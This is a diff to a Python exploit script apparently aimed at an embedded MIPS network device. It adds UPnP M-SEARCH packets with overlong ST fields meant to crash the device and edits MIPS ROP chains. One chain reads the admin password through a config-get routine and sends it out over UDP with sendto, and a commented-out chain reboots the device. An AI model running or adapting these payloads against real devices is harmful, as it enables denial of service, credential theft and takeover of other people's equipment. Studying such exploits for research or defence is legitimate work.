@@ -379,12 +379,72 @@ elif args.command == 'http':
             s.sendall(request)
             s.close()
         elif args.crash[1] == '5':
-            print("UPNP crash")
+            print("UPNP crash 1")
 
             # Build the request
             request = b"M-SEARCH * HTTP/1.0\r\n"
             request += b"HOST:239.255.255.250:1900\r\n"
             request += b"ST:uuid:Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar\r\n"
+            request += b"MX:2\r\n"
+            request += b"MAN:\"ssdp:discover\"\r\n\r\n"
+            
+            # Create socket and connect
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(5)
+            s.connect((args.ip, 1900))
+
+            # Send the request
+            s.sendall(request)
+            s.close()
+        elif args.crash[1] == '6':
+            print("UPNP crash 2")
+
+            # Build the request
+            request = b"M-SEARCH * HTTP/1.0\r\n"
+            request += b"HOST:239.255.255.250:1900\r\n"
+            request += b"ST:urn:schemas-upnp-org:device:"
+            request += b'a'*200
+            request += b":\r\n"
+            request += b"MX:2\r\n"
+            request += b"MAN:\"ssdp:discover\"\r\n\r\n"
+            
+            # Create socket and connect
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(5)
+            s.connect((args.ip, 1900))
+
+            # Send the request
+            s.sendall(request)
+            s.close()
+        elif args.crash[1] == '7':
+            print("UPNP crash 3")
+
+            # Build the request
+            request = b"M-SEARCH * HTTP/1.0\r\n"
+            request += b"HOST:239.255.255.250:1900\r\n"
+            request += b"ST:urn:schemas-wifialliance-org:service:"
+            request += b'a'*200
+            request += b":\r\n"
+            request += b"MX:2\r\n"
+            request += b"MAN:\"ssdp:discover\"\r\n\r\n"
+            
+            # Create socket and connect
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(5)
+            s.connect((args.ip, 1900))
+
+            # Send the request
+            s.sendall(request)
+            s.close()
+        elif args.crash[1] == '8':
+            print("UPNP crash 4")
+
+            # Build the request
+            request = b"M-SEARCH * HTTP/1.0\r\n"
+            request += b"HOST:239.255.255.250:1900\r\n"
+            request += b"ST:urn:schemas-wifialliance-org:device:"
+            request += b'a'*200
+            request += b":\r\n"
             request += b"MX:2\r\n"
             request += b"MAN:\"ssdp:discover\"\r\n\r\n"
             
@@ -417,6 +477,8 @@ elif args.command == 'http':
         sleep_addr = 0x8019abac
         connect_addr = 0x80129028
         strlen_addr = 0x801a717c
+        reboot_addr = 0x8000538c
+        config_get_addr = 0x800089e4
 
         # Build the ROP chain
         if (args.rop[0] == '1'): # print 'hello_core.con' to uart/telnet command line
@@ -823,7 +885,7 @@ elif args.command == 'http':
 
             # set a0 to be the id of the admin password
             # 0x000153d0: lw $a0, 4($s0); lw $ra, 4($sp); addiu $v0, $zero, 2; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8; 
-            chain += p32(0x800089e4 + 0x7b58) # s0
+            chain += p32(config_get_addr + 0x7b58) # s0
             chain += p32(0x11e568 + base_address)
 
             # 0x0011e568: lw $a1, ($sp); lw $ra, 0xc($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x10;
@@ -871,10 +933,10 @@ elif args.command == 'http':
             chain += p32(0xdeadbeef) # ra
         elif (args.rop[0] == '5'): # Send a UDP packet containing the admin password (need to make it able to handle arbitrary length with strlen or something)
             # Add the strings to the sX registers, and set the ra to first gadget
-            chain += p32(0xdeadbeef) # s0
-            chain += p32(0xdeadbeef) # s1
-            chain += p32(0xdeadbeef) # s2
-            chain += p32(0xdeadbeef) # s3
+            chain += p32(0xaaaaaaaa) # s0
+            chain += p32(0xbbbbbbbb) # s1
+            chain += p32(0xcccccccc) # s2
+            chain += p32(0xdddddddd) # s3
             chain += p32(0x11e670 + base_address) # ra
 
             ####################################################################
@@ -925,7 +987,7 @@ elif args.command == 'http':
 
             # Set a0 to be the id of the admin password
             # 0x000153d0: lw $a0, 4($s0); lw $ra, 4($sp); addiu $v0, $zero, 2; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8; 
-            chain += p32(0x800089e4 + 0x7b58) # s0
+            chain += p32(config_get_addr + 0x7b58) # s0
             chain += p32(0x11e568 + base_address)
 
             # 0x0011e568: lw $a1, ($sp); lw $ra, 0xc($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x10;
@@ -985,7 +1047,7 @@ elif args.command == 'http':
             ####### ssize_t sendto(int sockfd, const void *buf, size_t len, int flags, const struct sockaddr *dest_addr, socklen_t addrlen); #########
             ##########################################################################################################################################
 
-            # Load sockfd into v0
+            # Load sockfd address into v0
             # 0x001a9f9c: lw $v0, ($sp); lw $ra, 0x14($sp); lw $s1, 0x10($sp); lw $s0, 0xc($sp); jr $ra; addiu $sp, $sp, 0x18;
             chain += p32(sockfd_addr) # v0
             chain += b'b' * 8
@@ -993,7 +1055,7 @@ elif args.command == 'http':
             chain += p32(sockaddr_addr) # s1
             chain += p32(0x1a46dc + base_address) # ra
 
-            # Load hardcoded afinet stuff into v0 (currently has the address)
+            # Load sockfd value into v0
             # 0x001a46dc: lw $v0, ($v0); lw $ra, 4($sp); jr $ra; addiu $sp, $sp, 8; 
             chain += b'b' * 4
             chain += p32(0x1746c8 + base_address)
@@ -1003,9 +1065,9 @@ elif args.command == 'http':
             chain += p32(0xdeadbeef) # s0
             chain += p32(0x11e568 + base_address) # ra
 
-            # Move 'hello' into a1 (clobbers v0 but thats fine)
+            # Move admin pwd into a1
             # 0x0011e568: lw $a1, ($sp); lw $ra, 0xc($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x10; 
-            chain += p32(pwd_buffer) # a1 (address of hello)
+            chain += p32(pwd_buffer) # a1 (address of admin pwd)
             chain += b'b' * 0x8
             chain += p32(0xbb6e4 + base_address) # ra
 
@@ -1089,7 +1151,49 @@ elif args.command == 'http':
             # Call sendto and regain control
             # 0x15114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8; 
             chain += b'b' * 4
-            chain += p32(0xdeadb33f) # ra
+            chain += p32(0xdeadbeef) # ra
+
+            # ##################################################
+            # ################ Fix stack #######################
+            # ##################################################
+
+            # # For fixing
+            # old_fp = 0x802aba20
+            # old_sp = 0x802ab9c0
+
+            # # Load old sp - 0x20 into fp
+            # # 0x00016970: lw $ra, 0x1c($sp); lw $fp, 0x18($sp); addiu $sp, $sp, 0x20; jr $ra; nop;
+            # chain += b'b' * 0x18
+            # chain += p32(old_sp - 0x20) # fp
+            # chain += p32(0x1a624 + base_address) # ra
+
+            # # Move the fp into sp
+            # # 0x0001a624: move $sp, $fp; lw $ra, 0x1c($sp); lw $fp, 0x18($sp); lw $s3, 0x14($sp); lw $s2, 0x10($sp); lw $s1, 0xc($sp); lw $s0, 8($sp); jr $ra; addiu $sp, $sp, 0x20;
+            # chain += b'c' * 100
+            
+            #################################################
+            ################## reboot #######################
+            #################################################
+
+            # # Set first argument for socket to 2
+            # # 0x0011e670: addiu $a0, $zero, 2; lw $ra, 4($sp); move $v0, $zero; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
+            # chain += b'b' * 4
+            # chain += p32(0x19bc58 + base_address) # ra
+
+            # # 0x0019bc58: lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
+            # chain += p32(reboot_addr + 0x7b58) # s0
+            # chain += p32(0x137960 + base_address) # ra
+
+            # ## The address of reboot contains a null byte, so we will have to do some subtracting (s0 is set to address of function + 0x7b58)
+            # # 0x00137960: addiu $v0, $s0, -0x7b58; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
+            # chain += p32(0xdeadbeef) # s0
+            # chain += p32(0x15114 + base_address) # ra
+
+            # ## Now call config load
+            # # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
+            # chain += b'b' * 0x4
+            # chain += p32(0xdeadbeef) # ra
+            
         else:
             print("[-] Bad type")
             exit(1)
